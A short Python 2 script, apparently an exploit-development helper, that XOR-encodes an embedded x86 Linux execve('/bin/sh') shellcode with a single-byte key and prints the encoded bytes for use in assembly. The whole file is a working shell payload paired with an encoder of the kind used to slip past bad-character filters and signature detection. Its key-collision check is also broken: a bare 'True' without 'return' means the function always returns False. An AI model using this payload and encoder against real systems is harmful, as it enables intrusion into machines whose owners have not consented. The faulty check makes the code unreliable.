#!/usr/bin/env python2


import sys


def check(sc, key):
    '''takes string of bytes (shellcode) and a single byte key. returns True if key is found otherwise returns False'''
    for b in sc:
        if b == key:
            True
    return False


def xor(sc, key):
    '''takes string of bytes (shellcode) and a single byte key. returns list of key ^ bytes'''
    c = []
    for b in sc:
        c.append(hex(ord(key) ^ ord(b)))
    return c


def pprint(c):
    '''takes list of byte strings and prints out a usable format for x86 asm'''
    print("\n[*]Shellcode Length: " + str(len(c)))
    print("[*]Shellcode: " + ", ".join(c) + "\n")
    return


if __name__=="__main__":
    
    # do magic

    # xor key goes here
    key = "\xaa"

    # shellcode goes here
    sc = ("\x31\xc0\x68\x43\x43\x43\x43\x89\x04\x24\x89\xe2\x68\x42\x42\x42\x42\x89\xe1\x68\x2f\x73\x68\x41\x88\x44\x24\x03\x68\x2f\x62\x69\x6e\x89\xe3\x89\x64\x24\x08\xb0\x0b\xcd\x80")

    if (check(sc, key)):
        print("[-]Error: key found in sc...aborting")
        sys.exit(0)

    c = xor(sc, key)

    pprint(c)

    print("[+]Done!!!")
